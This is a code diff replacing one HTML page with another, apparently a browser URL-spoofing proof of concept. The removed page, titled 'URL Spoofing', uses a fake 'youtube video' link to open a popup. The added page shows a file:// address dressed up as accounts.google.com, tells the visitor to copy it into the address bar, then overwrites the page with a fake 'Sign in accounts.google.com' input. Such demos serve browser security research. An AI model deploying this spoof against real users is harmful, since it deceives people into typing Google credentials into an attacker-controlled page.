@@ -1,23 +1,23 @@
+<html>
+	<head></head>
+	<body>
+		Visit this link: <span id="304url">file://www.verylongurl.googlecloudplatform.accounts.google.com/</span> (please copy and paste into your address bar)<br>
+		<button onclick="copyUrl();">copy url</button>
+		<script>
+		
 
-<!DOCTYPE HTML>
-<html lang="en-US">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, user-scalable=no">
-    <title>URL Spoofing</title>
-    <script>
-        function openWin() {
-            var width=600, height=400, top=50, left=(screen.width/2)-(width/2);
-            window.open("opener.html", "first", `width=${width},height=${height},top=${top},left=${left}`);
-        }
-    </script>
-</head>
-
-<body>
-    <center>
-        <br>
-        <h1><a href="#" onclick="openWin();">Click here to check my youtube video</a></h1>
-    </center>
-</body>
+			function copyUrl(){
+				const url = document.getElementById("304url");
+				if(!window.getSelection) return;
+				var range = document.createRange();
+				range.selectNodeContents(url);
+				var sel = window.getSelection();
+				sel.removeAllRanges();
+				sel.addRange(range);
+				document.execCommand("copy");
+				
+				setTimeout('document.write("Sign in accounts.google.com <input />")', 4300);
+			}
+		</script>
+	</body>
 </html>
-
